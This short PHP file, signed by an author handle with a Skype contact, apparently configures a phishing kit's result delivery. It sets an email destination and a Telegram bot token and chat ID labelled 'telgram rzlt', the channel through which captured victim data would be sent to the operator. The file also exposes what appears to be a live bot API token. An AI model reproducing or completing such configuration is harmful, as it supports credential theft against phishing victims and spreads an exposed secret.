<?php
/*
  //||~~ By ~~ saradauchia ~~\\ 
// Skype: saradauchia2 \\	
*/

$send ="@gmail.com"; 

//telgram rzlt
$api = "7012011278:AAGVe2KpepbZw_WJgqmj0rWTYgP6OaP9eRE";
$chatid = "7390801742";


?>